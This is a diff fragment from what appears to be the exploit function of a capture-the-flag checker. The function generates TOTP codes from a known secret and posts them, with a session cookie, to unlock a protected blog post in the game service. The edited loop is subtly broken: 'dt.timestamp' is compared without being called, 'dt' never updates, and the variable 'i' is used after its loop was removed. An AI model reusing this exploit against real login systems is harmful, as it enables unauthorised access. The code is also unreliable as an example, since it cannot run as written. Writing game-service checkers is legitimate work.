@@ -255,7 +255,12 @@ async def exploit_zero(task: ExploitCheckerTaskMessage,
     totp_device.calculate_current_timestep_count()
 
     #60 divided by range -> length of validity period
-    for i in range(5):
+#    for i in range(5):
+
+    dt = datetime.datetime.now(timezone.utc)
+    end = int(dt.timestamp())+3
+    while int(dt.timestamp) <= end:
+
         usercode = totp_device.generate_otp(totp_device.secret_key, totp_device.timestep_counter+i)
         logger.debug(f"round: {i}, user: {username}, accessing post: {title}, timestamp: {timestamp}, usercode: {usercode}")
         r = await client.post("auth/accessblogpost/"+ str(post_id), data={"code":usercode}, cookies=cookie)
